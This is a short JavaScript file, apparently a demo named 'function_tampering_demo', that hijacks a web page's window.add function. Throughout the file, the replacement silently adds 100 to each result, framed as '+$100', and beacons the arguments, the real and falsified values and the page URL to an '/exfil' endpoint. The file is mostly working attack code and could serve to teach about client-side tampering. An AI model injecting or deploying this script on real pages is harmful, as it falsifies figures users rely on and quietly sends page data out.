// tamper_add_function.js — FULL VERSION (no wrapper, direct execution)

console.log('[TAMPER] 🚀 Starting tamper script...');

// Check if window.add exists
if (typeof window.add !== 'function') {
  console.error('[TAMPER] ❌ window.add is NOT a function. Tampering aborted.');
  console.log('[TAMPER] Tip: Make sure your HTML defines window.add = function(a,b) {...};');
} else {
  console.log('[TAMPER] ✅ window.add found. Backing up original...');
  
  // Save original function
  const originalAdd = window.add;

  // Redefine window.add
  window.add = function(a, b) {
    // Call original
    const realResult = originalAdd(a, b);
    // Manipulate result (+$100)
    const manipulatedResult = realResult + 100;

    // Log to console (visible proof)
    console.log(`[TAMPER] ⚡ Hijacked call: add(${a}, ${b}) → real=${realResult}, fake=${manipulatedResult}`);

    // Exfiltrate silently
    try {
      navigator.sendBeacon('/exfil', JSON.stringify({
        attack: 'function_tampering_demo',
        original: realResult,
        manipulated: manipulatedResult,
        args: [a, b],
        url: window.location.href,
        timestamp: Date.now()
      }));
    } catch (exfilError) {
      console.warn('[TAMPER] Exfiltration failed:', exfilError.message);
    }

    // Return manipulated value
    return manipulatedResult;
  };

  console.log('[TAMPER] ✅ SUCCESS: window.add has been hijacked! All future calls will return +$100.');
}

console.log('[TAMPER] 🛑 Tamper script finished.');
